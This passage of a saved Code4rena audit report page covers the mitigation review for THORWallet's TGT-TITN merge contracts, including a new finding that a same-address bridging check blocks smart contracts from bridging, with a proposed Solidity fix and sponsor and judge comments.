<h3 style="position:relative;" id="recommended-mitigation-steps-7"><a class="anchor before" aria-label="recommended mitigation steps 7 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Add a function to remove addresses from the bridged holders mapping.</p>
<hr>
<h1 style="position:relative;" id="mitigation-review"><a class="anchor before" aria-label="mitigation review permalink" href="https://code4rena.com/reports/2025-02-thorwallet#mitigation-review"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/reports/2025-02-thorwallet#mitigation-review">Mitigation Review</a></h1>
<h2 style="position:relative;" id="introduction"><a class="anchor before" aria-label="introduction permalink" href="https://code4rena.com/reports/2025-02-thorwallet#introduction"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Introduction</h2>
<p>Following the C4 audit, 3 wardens (<a href="https://code4rena.com/@web3km">web3km</a>, <a href="https://code4rena.com/@shaflow2">shaflow2</a> and <a href="https://code4rena.com/@kn0t">kn0t</a>) reviewed the mitigations for all identified issues. Additional details can be found within the <a href="https://github.com/code-423n4/2025-03-thorwallet-mitigation">C4 THORWallet Mitigation Review repository</a>.</p>
<h2 style="position:relative;" id="mitigation-review-scope"><a class="anchor before" aria-label="mitigation review scope permalink" href="https://code4rena.com/reports/2025-02-thorwallet#mitigation-review-scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Mitigation Review Scope</h2>
<table>
<thead>
<tr>
<th>URL</th>
<th>Mitigation of</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4">https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4</a></td>
<td><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9">H-02</a></td>
<td>Only allow bridging to the sender’s own address</td>
</tr>
<tr>
<td><a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2">https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/2</a></td>
<td><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6">H-01</a></td>
<td>Fix issue when depositing more TGT and specified in the contract</td>
</tr>
<tr>
<td><a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1">https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/1</a></td>
<td><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3">ADD-01 (F-3)</a></td>
<td>Fix issue claiming TITN on day 360</td>
</tr>
<tr>
<td><a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3">https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/3</a></td>
<td><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4">ADD-02 (F-4)</a></td>
<td>Do not allow transfers to the LZ endpoint as it is not needed</td>
</tr>
</tbody>
</table>
<h3 style="position:relative;" id="out-of-scope"><a class="anchor before" aria-label="out of scope permalink" href="https://code4rena.com/reports/2025-02-thorwallet#out-of-scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Out of Scope</h3>
<p>All sponsor <code>acknowledged</code> (wontfix) findings, including:</p>
<ul>
<li><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-7">M-01: Improper Transfer Restrictions on Non-Bridged Tokens Due to Boolean Bridged Token Tracking, Allowing a DoS Attack Vector</a></li>
</ul>
<h2 style="position:relative;" id="mitigation-review-summary"><a class="anchor before" aria-label="mitigation review summary permalink" href="https://code4rena.com/reports/2025-02-thorwallet#mitigation-review-summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Mitigation Review Summary</h2>
<p>During the mitigation review, the wardens determined that 4 in-scope findings from the original audit were fully mitigated. They also surfaced one new issue of High severity. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the new issue.</p>
<table>
<thead>
<tr>
<th align="center">Original Issue</th>
<th>Status</th>
<th>Full Details</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-6">H-01</a></td>
<td>Mitigation confirmed</td>
<td>Reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9">web3km</a> and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13">kn0t</a></td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-9">H-02</a></td>
<td>Mitigation confirmed</td>
<td>Reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-3">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-14">web3km</a>, and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-12">kn0t</a></td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-3">ADD-01</a></td>
<td>Mitigation confirmed</td>
<td>Reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-2">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-6">web3km</a>, and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-10">kn0t</a></td>
</tr>
<tr>
<td align="center"><a href="https://code4rena.com/evaluate/2025-02-thorwallet/findings/F-4">ADD-02</a></td>
<td>Mitigation confirmed</td>
<td>Reports from <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-1">shaflow2</a>, <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-7">web3km</a>, and <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-11">kn0t</a></td>
</tr>
</tbody>
</table>
<hr>
<h2 style="position:relative;" id="f-9-unmitigated"><a class="anchor before" aria-label="f 9 unmitigated permalink" href="https://code4rena.com/reports/2025-02-thorwallet#f-9-unmitigated"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8">F-9 Unmitigated</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8">web3km</a>, also found by <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5">shaflow2</a></em></p>
<p><strong>Severity: High</strong></p>
<h3 style="position:relative;" id="vulnerability-details-1"><a class="anchor before" aria-label="vulnerability details 1 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#vulnerability-details-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Vulnerability details</h3>
<p>The TITN protocol recently fixed a problem where users could get around transfer limits by bridging tokens between different chains.</p>
<p>To stop this, a new check was added in _send to make sure that the receiver on the other chain is the same as the msg.sender on the current chain.</p>
<p>This fix works, but it also creates a new problem: smart contracts can no longer use the bridge.</p>
<h3 style="position:relative;" id="impact"><a class="anchor before" aria-label="impact permalink" href="https://code4rena.com/reports/2025-02-thorwallet#impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Unlike regular wallets (EOAs), smart contracts usually don’t have the same address on different chains. Because of this, they can’t pass the new check and can’t bridge tokens.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-8"><a class="anchor before" aria-label="recommended mitigation steps 8 permalink" href="https://code4rena.com/reports/2025-02-thorwallet#recommended-mitigation-steps-8"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>To fix this while still keeping transfers safe, consider using the same rules from _validateTransfer instead of requiring the sender and receiver to have the same address.</p>
<pre data-index="21" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">- require(_sendParam.to == bytes32(uint256(uint160(msg.sender))), "Must bridge to your own address");</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+ if (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       isBridgedTokensTransferLocked &amp;&amp;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       (isBridgedTokenHolder[_from] || block.chainid == arbitrumChainId)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       revert BridgedTokensTransferLocked();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   }</span></span></span></code></pre>
<h3 style="position:relative;" id="links-to-affected-code"><a class="anchor before" aria-label="links to affected code permalink" href="https://code4rena.com/reports/2025-02-thorwallet#links-to-affected-code"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Links to affected code</h3>
<p><a href="https://github.com/THORWallet/TGT-TITN-merge-contracts/blob/8b65b79609b819a5420ad783b642b284efa7d6fb/contracts/Titn.sol#L120">Titn.sol#L120</a></p>
<p><strong><a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=ARLr286sawG">cacaomatt (THORWallet) commented</a>:</strong></p>
<blockquote>
<p>Valid finding, we’ll implement the suggested update.</p>
</blockquote>
<p><strong><a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-8?commentParent=DQhUPSqQaZg">0xnev (judge) commented</a>:</strong></p>
<blockquote>
<p>I am accepting this as a new submission per discussions and comments noted <a href="https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-5?commentParent=hcgcqmrecZc&amp;commentChild=i6C7J44nVPf">here</a>. </p>
<p>Listing as mitigated as sponsor acknowledges this as design decision and will accept only EOAs for bridging during lockup period. This fix will likely be performed on the UI as mentioned.</p>
</blockquote>
<hr>
<h1 style="position:relative;" id="disclosures"><a class="anchor before" aria-label="disclosures permalink" href="https://code4rena.com/reports/2025-02-thorwallet#disclosures"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Disclosures</h1>
<p>C4 is an open organization governed by participants in the community.</p>
<p>C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>
<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>
<style class="grvsc-styles">
  .grvsc-container {
    overflow: auto;
    position: relative;
    -webkit-overflow-scrolling: touch;
    padding-top: 1rem;
    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));
    padding-bottom: 1rem;
    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));
    border-radius: 8px;
    border-radius: var(--grvsc-border-radius, 8px);
    font-feature-settings: normal;
    line-height: 1.4;
  }
  
  .grvsc-code {
    display: table;
  }
  
  .grvsc-line {
    display: table-row;
    box-sizing: border-box;
    width: 100%;
    position: relative;
  }
  
  .grvsc-line > * {
    position: relative;
  }
  
  .grvsc-gutter-pad {
    display: table-cell;
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  .grvsc-gutter {
    display: table-cell;
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter::before {
    content: attr(data-content);
  }
  
  .grvsc-source {
    display: table-cell;
    padding-left: 1.5rem;
    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));
    padding-right: 1.5rem;
    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));
  }
  
  .grvsc-source:empty::after {
    content: ' ';
    -webkit-user-select: none;
    -moz-user-select: none;
    user-select: none;
  }
  
  .grvsc-gutter + .grvsc-source {
    padding-left: 0.75rem;
    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);
  }
  
  /* Line transformer styles */
  
  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {
    content: ' ';
    position: absolute;
    width: 100%;
  }
  
  .grvsc-line-diff-add::before {
    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));
  }
  
  .grvsc-line-diff-del::before {
    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));
  }
  
  .grvsc-line-number {
    padding: 0 2px;
    text-align: right;
    opacity: 0.7;
  }
  
  .dark-default-dark {
    background-color: #1E1E1E;
    color: #D4D4D4;
  }
  .dark-default-dark .mtk15 { color: #C586C0; }
  .dark-default-dark .mtk1 { color: #D4D4D4; }
  .dark-default-dark .mtk12 { color: #9CDCFE; }
  .dark-default-dark .mtk8 { color: #CE9178; }
  .dark-default-dark .mtk11 { color: #DCDCAA; }
  .dark-default-dark .mtk4 { color: #569CD6; }
  .dark-default-dark .mtk3 { color: #6A9955; }
  .dark-default-dark .mtk7 { color: #B5CEA8; }
  .dark-default-dark .mtk10 { color: #4EC9B0; }
  .dark-default-dark .mtk6 { color: #D7BA7D; }
  .dark-default-dark .mtk14 { color: #F44747; }
  .dark-default-dark .grvsc-line-highlighted::before {
    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));
    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));
  }
</style></div></div><div class="core-app-report__sidebar"><div class="core-app-report__toc"><div class="core-app-report__toc-header"><h1 class="core-app-report__toc-title">Table of contents</h1><svg class="core-app-report__toc-arrow " width="24" height="25" viewBox="0 0 24 25" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 9.5L12 16.5L5 9.5" stroke="#ADABB2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div></div></div></main></div></div><script src="./THORWallet_files/webpack-ee83ff9cf0b0c89c.js.download" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0]);self.__next_f.push([2,null])</script><script>self.__next_f.push([1,"1:HL[\"/_next/static/media/9b7eb431f23ca42e-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n2:HL[\"/_next/static/media/b603571150b520e0-s.p.ttf\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/ttf\"}]\n3:HL[\"/_next/static/media/d9396795aa5ec363-s.p.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n4:HL[\"/_next/static/css/aa1e03632b0a9f00.css\",\"style\"]\n5:HL[\"/_next/static/css/2c612863d5a616cb.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"6:I[12846,[],\"\"]\n9:I[4707,[],\"\"]\nb:I[36423,[],\"\"]\nc:I[15718,[\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"3211\",\"static/chunks/app/reports/error-337d8165658cb655.js\"],\"default\"]\nf:I[61060,[],\"\"]\na:[\"slug\",\"2025-02-thorwallet\",\"d\"]\n10:[]\n0:[\"$\",\"$L6\",null,{\"buildId\":\"GcxK7sNbw6COX75T-g0fs\",\"assetPrefix\":\"\",\"urlParts\":[\"\",\"reports\",\"2025-02-thorwallet\"],\"initialTree\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-02-thorwallet\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],\"initialSeedData\":[\"\",{\"children\":[\"reports\",{\"children\":[[\"slug\",\"2025-02-thorwallet\",\"d\"],{\"children\":[\"__PAGE__\",{},[[\"$L7\",\"$L8\",null],null],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\",\"$a\",\"children\"],\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[null,[\"$\",\"$L9\",null,{\"parallelRouterKey\":\"children\",\"segmentPath\":[\"children\",\"reports\",\"children\"],\"error\":\"$c\",\"errorStyles\":[],\"errorScripts\":[],\"template\":[\"$\",\"$Lb\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"notFoundStyles\":\"$undefined\"}]],null]},[[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/aa1e03632b0a9f00.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/2c612863d5a616cb.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\"}]],\"$Ld\"],null],null],\"couldBeIntercepted\":false,\"initialHead\":[null,\"$Le\"],\"globalErrorComponent\":\"$f\",\"missingSlots\":\"$W10\"}]\n"])</script><script>self.__next_f.push([1,"11:I[36525,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"6686\",\"static/chunks/6686-dd6382cfde9e8708.js\",\"5813\",\"static/chunks/5813-7499623caf5cc29b.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"3185\",\"static/chunks/app/layout-c054eff4d03ebbf2.js\"],\"default\"]\n12:I[75292,[\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"9160\",\"static/chunks/app/not-found-c0beac80bd3674ca.js\"],\"default\"]\n13:I[80319,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\n14:I[39350,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea"])</script><script>self.__next_f.push([1,"2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5Bslug%5D/page-220cafabfbe0a147.js\"],\"default\"]\n17:I[75899,[\"8550\",\"static/chunks/da2599a7-883aa94cd391c09d.js\",\"8218\",\"static/chunks/aaea2bcf-7a609d2a8547b978.js\",\"5501\",\"static/chunks/c16f53c3-1c73b34d2bc72b67.js\",\"5986\",\"static/chunks/0815f603-89dbad4b5756c5c4.js\",\"2972\",\"static/chunks/2972-f84899d403fe0acb.js\",\"5878\",\"static/chunks/5878-bdbba189b5f619d7.js\",\"1700\",\"static/chunks/1700-bbc1d97db9b9492c.js\",\"2636\",\"static/chunks/2636-173262633c516a97.js\",\"3504\",\"static/chunks/3504-22e800882144201d.js\",\"4105\",\"static/chunks/4105-30871074ad2edc9d.js\",\"6390\",\"static/chunks/6390-77d8d06791482011.js\",\"1638\",\"static/chunks/1638-db2c32ae38fcd41e.js\",\"191\",\"static/chunks/191-92b4f6645071a623.js\",\"5028\",\"static/chunks/5028-123aa2d0fc9289a2.js\",\"867\",\"static/chunks/867-d827a4f529ecb777.js\",\"7834\",\"static/chunks/7834-2536a8f829bd1d9d.js\",\"1960\",\"static/chunks/app/reports/%5